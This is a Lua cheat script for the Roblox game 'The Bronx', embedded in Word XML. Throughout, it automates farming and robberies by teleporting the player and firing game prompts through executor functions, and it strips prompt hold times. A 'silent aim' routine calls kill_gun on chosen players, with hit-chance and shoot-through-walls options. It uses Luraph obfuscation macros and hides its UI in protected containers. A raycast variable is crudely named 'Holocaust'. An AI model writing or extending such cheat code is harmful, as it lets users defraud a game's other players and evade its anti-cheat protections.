        <w:t xml:space="preserve">                        Teleport(CFrame.new(-1729, 371, -1171))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Workspace.ConstructionStuff["Start Job"].Prompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() until LocalPlayer:GetAttribute("WorkingJob")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Backpack:FindFirstChild("PlyWood") and not LocalPlayer.Character:FindFirstChild("PlyWood") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(CFrame.new(-1728, 371, -1178))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() fireproximityprompt(Workspace.ConstructionStuff["Grab Wood"].Prompt) until LocalPlayer.Backpack:FindFirstChild("PlyWood") or LocalPlayer.Character:FindFirstChild("PlyWood")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    repeat task.wait() until LocalPlayer.Backpack:FindFirstChild("PlyWood") or LocalPlayer.Character:FindFirstChild("PlyWood")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("PlyWood"))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local PlaceToPlaceWood = GetPlaceToPlaceWood()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not PlaceToPlaceWood then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Teleport(PlaceToPlaceWood.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    repeat task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(PlaceToPlaceWood.Prompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    until not LocalPlayer.Character:FindFirstChild("PlyWood") or not PlaceToPlaceWood.Prompt.Enabled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true do task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.Farms.FarmBank then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character:FindFirstChild("Humanoid") or LocalPlayer.Character:FindFirstChild("Humanoid").Health == 0 then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Robbable = Workspace.vault.door.robPrompt.ProximityPrompt.Enabled</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Robbable then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Config.TheBronx.Farms.AFKCheck then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Teleport(SafePosition)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character:FindFirstChild("DuffelBag") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(CFrame.new(-397, 340, -551))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Workspace.dufflebagequip:FindFirstChildWhichIsA("ProximityPrompt"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Backpack:FindFirstChild("C4") and not LocalPlayer.Character:FindFirstChild("C4") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(CFrame.new(-393, 340, -564))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Workspace.GUNS.C4.Handle.BuyPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    repeat task.wait() until LocalPlayer.Backpack:FindFirstChild("C4") or LocalPlayer.Character:FindFirstChild("C4")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("C4"))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Teleport(CFrame.new(-196, 374, -1216))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    fireproximityprompt(Workspace.vault.door.robPrompt.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(2)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Number = LocalPlayer.Character.DuffelBag.display.SurfaceGui.Frame.TextLabel.Text</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Number = Number:gsub("0/", "")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index = 1, tonumber(Number) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Cash = Workspace.BankItems.Cash:FindFirstChild("Cash")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Cash then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            for i,v in Workspace:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if v.Name == "Cash" and v:IsA("Model") and v:FindFirstChild("Model") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Cash = v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Teleport(Cash.Model.Cash.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Cash.Model:FindFirstChildWhichIsA("ProximityPrompt", true))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Teleport(Workspace.sellgold.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    fireclickdetector(Workspace.sellgold.ClickDetector)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true do task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.Farms.FarmHouses then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character:FindFirstChild("Humanoid") or LocalPlayer.Character:FindFirstChild("Humanoid").Health == 0 then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local HardDoorEnabled = Workspace.HouseRobb.HardDoor.Door:FindFirstChildWhichIsA("ProximityPrompt", true).Enabled</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not HardDoorEnabled and Config.TheBronx.Farms.AFKCheck then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(SafePosition)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if HardDoorEnabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(Workspace.HouseRobb.HardDoor.Door:FindFirstChildWhichIsA("ProximityPrompt", true).Parent.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Workspace.HouseRobb.HardDoor.Door:FindFirstChildWhichIsA("ProximityPrompt", true))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        until Workspace.HouseRobb.HardDoor:FindFirstChild("TakeMoney") and Workspace.HouseRobb.HardDoor:FindFirstChild("TakeMoney"):FindFirstChild("MoneyGrab"):FindFirstChildWhichIsA("ProximityPrompt", true).Enabled</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for Index, Value in Workspace.HouseRobb.HardDoor.TakeMoney:GetChildren() do                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Teleport(Value.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            fireproximityprompt(Value.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(0.025)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        continue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task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while true do task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.Farms.FarmStudio then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character:FindFirstChild("Humanoid") or LocalPlayer.Character:FindFirstChild("Humanoid").Health == 0 then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Prompt1, Prompt2, Prompt3 = Workspace.StudioPay.Money.StudioPay1:FindFirstChild("Prompt", true), Workspace.StudioPay.Money.StudioPay2:FindFirstChild("Prompt", true), Workspace.StudioPay.Money.StudioPay3:FindFirstChild("Prompt", true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Prompt1.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(Prompt1.Parent.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Prompt1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Prompt2.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(Prompt2.Parent.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Prompt2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Prompt3.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(Prompt3.Parent.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Prompt3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.TheBronx.Farms.AFKCheck then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport(SafePosition)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        continue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PressKey = function(KeyCode, Duration)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Services.VirtualInputManager:SendKeyEvent(false, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Services.VirtualInputManager:SendKeyEvent(true, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(Duration)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Services.VirtualInputManager:SendKeyEvent(false, KeyCode, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while true do task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.Farms.FarmTrash then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character:FindFirstChild("Humanoid") or LocalPlayer.Character:FindFirstChild("Humanoid").Health == 0 then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in Workspace:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value.Name == "DumpsterPromt" and Config.TheBronx.Farms.FarmTrash then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Value:FindFirstChild("ProximityPrompt") and Value:FindFirstChild("ProximityPrompt").Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Value:FindFirstChild("ProximityPrompt").HoldDuration = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Teleport(CFrame.new(Value.Position.X, Value.Position.Y, Value.Position.Z))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PressKey(Enum.KeyCode.E)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    fireproximityprompt(Value:FindFirstChild("ProximityPrompt"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Value:FindFirstChild("ProximityPrompt").HoldDuration = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.TheBronx.Farms.AutoSellTrash then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for Index, Value in LocalPlayer.Backpack:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Value:IsA("Tool") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ReplicatedStorage:WaitForChild("PawnRemote"):FireServer(Value.Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait()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    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(1)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GetGoodCleaner = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local CounterInstance;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Workspace["1# Map"]:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value:FindFirstChild("CounterM") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CounterInstance = Value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for Index, Value in next, {Workspace.CounterBag:GetChildren(), CounterInstance:GetChildren()} do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for _Index, _Value in Value do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if _Value:FindFirstChild("CashPrompt", true) and _Value:FindFirstChild("CashPrompt", true).Enabled and _Value:FindFirstChild("CashPrompt", true).ObjectText == "Count Bread" and _Value:FindFirstChild("GrabPrompt", true) and not _Value:FindFirstChild("GrabPrompt", true).Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return _Value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UserInputService.InputBegan:Connect(function(Input, GameProcessedEvent)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Input.KeyCode == Config.TheBronx.VehicleModifications.InstantStopBind and Config.TheBronx.VehicleModifications.InstantStop and (not GameProcessedEvent) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if LocalPlayer.Character and typeof(LocalPlayer.Character) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Humanoid = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Humanoid and typeof(Humanoid) == "Instance" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local SeatPart = Humanoid.SeatPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    SeatPart.AssemblyLinearVelocity *= Vector3.new(0, 0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    SeatPart.AssemblyAngularVelocity *= Vector3.new(0, 0, 0)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if Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.PlayerScripts.BulletVisualizerClientScript.Visualize.Event:Connect(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local args = {...}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local data = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ["damage"] = args[10][1],</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ["player"] = args[1].Parent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if rawget(data, "damage") and type(args[10][1]) == 'number' and Config.Silent.Enabled and Config.Silent.Targetting and args[10] and data["player"] == LocalPlayer.Character then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not (math.random(0, 100) &lt;= Config.Silent.HitChance) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local RandomPart = Config.Silent.TargetPart[1] and Config.Silent.TargetPart[math.random(1, #Config.Silent.TargetPart)] or "Head"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if SilentTarget and SilentTarget.Character and SilentTarget.Character:FindFirstChild(RandomPart) then</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not Config.Silent.WallBang then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local Holocaust = Workspace:FindPartOnRayWithIgnoreList(Ray.new(LocalPlayer.Character[RandomPart].Position, (SilentTarget.Character[RandomPart].Position - LocalPlayer.Character[RandomPart].Position).Unit * (SilentTarget.Character[RandomPart].Position - LocalPlayer.Character[RandomPart].Position).Magnitude), {SilentTarget.Character, LocalPlayer.Character})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Holocaust then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            kill_gun(tostring(SilentTarget), RandomPart, data["damage"])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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            HideUI = LPH_NO_VIRTUALIZE(function(Title, Timing)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                getgenv().HideScreenGUI = Instance.new("ScreenGui")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                getgenv().HideScreenGUI.Name = "\n\n\n\n\n"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                getgenv().HideScreenGUI.Parent = gethui and gethui() or Services.CoreGui</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local frame = Instance.new("Frame")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.Name = "BlackFrame"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.Size = UDim2.new(2, 0, 2, 0) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.Position = UDim2.new(0, -155, 0, -155) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.BackgroundTransparency = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.Parent = getgenv().HideScreenGUI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local textLabel = Instance.new("TextLabel")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Name = "\nhideuiaethra"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Size = UDim2.new(0, 400, 0, 100)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Font = Enum.Font.SourceSansBold</w:t>
      </w:r>
    </w:p>
